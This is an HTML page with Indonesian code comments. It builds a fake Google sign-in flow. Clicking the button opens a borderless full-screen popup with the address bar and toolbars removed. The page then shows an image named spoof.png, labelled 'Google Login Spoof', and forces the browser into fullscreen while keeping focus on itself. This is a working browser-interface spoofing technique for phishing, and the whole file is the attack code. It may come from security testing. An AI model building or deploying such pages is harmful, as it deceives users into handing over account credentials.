<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, user-scalable=no" />
    <title>URL TESTING WEBVIEW</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        overflow: hidden;
        background: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      #spoof-img {
        display: none; /* Awalnya disembunyikan */
        max-width: 100%;
        max-height: 100%;
        object-fit: contain;
        position: absolute;
        top: 0;
        left: 0;
        z-index: 1;
      }
      .signin-link {
        padding: 20px 40px;
        background: #4285f4;
        color: white;
        font-size: 18px;
        text-decoration: none;
        border-radius: 4px;
        cursor: pointer;
        z-index: 10;
        position: relative; /* Agar bisa disembunyikan dengan lancar */
      }
    </style>
    <script>
      function goFullscreen() {
        var elem = document.documentElement;
        if (elem.requestFullscreen) elem.requestFullscreen();
        else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
        else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
        else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
      }

      function openWin() {
        // Buka popup hampir fullscreen
        var params =
          "width=" +
          screen.width +
          ",height=" +
          screen.height +
          ",top=0,left=0" +
          ",menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no";

        var win = window.open("opener.html", "google_signin", params);
        if (win) {
          win.moveTo(0, 0);
          win.resizeTo(screen.width, screen.height);
          // JANGAN panggil win.focus() - biarkan fokus di main window
        }

        // Tampilkan gambar spoof.png langsung
        document.getElementById("spoof-img").style.display = "block";

        // Sembunyikan tombol setelah 1 detik
        setTimeout(function () {
          document.querySelector(".signin-link").style.display = "none";
        }, 1000);

        // PENTING: Pastikan fokus di main window, lalu fullscreen
        window.focus(); // Kembalikan fokus ke main window
        setTimeout(function () {
          goFullscreen(); // Delay sedikit untuk memastikan fokus sudah pindah
        }, 100);
      }
    </script>
  </head>
  <body>
    <!-- Tombol awal -->
    <a href="#" class="signin-link" onclick="openWin(); return false;">
      Double Click here to sign in into your Google Account v2
    </a>

    <!-- spoof.png akan muncul langsung setelah klik -->
    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
  </body>
</html>
